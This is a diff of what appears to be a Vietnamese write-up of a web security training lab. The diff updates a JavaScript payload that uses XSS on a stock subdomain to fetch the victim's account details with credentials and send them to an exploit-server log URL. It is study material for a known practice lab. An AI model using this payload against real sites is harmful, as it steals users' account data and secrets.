@@ -92,7 +92,7 @@ Context: ở đây subdomain `stock.domain chính` bị XSS từ đây ta có pa
 
 ```html
 <script>
-    document.location="http://stock.0a41007504014d858586c60500f000c4.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a41007504014d858586c60500f000c4.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a2e0093048b4d188569c55301ea0032.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    document.location="http://stock.0aa300c60441833c80501215002800e5.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aa300c60441833c80501215002800e5.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a29005b042a83c0807c11c901020006.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
 
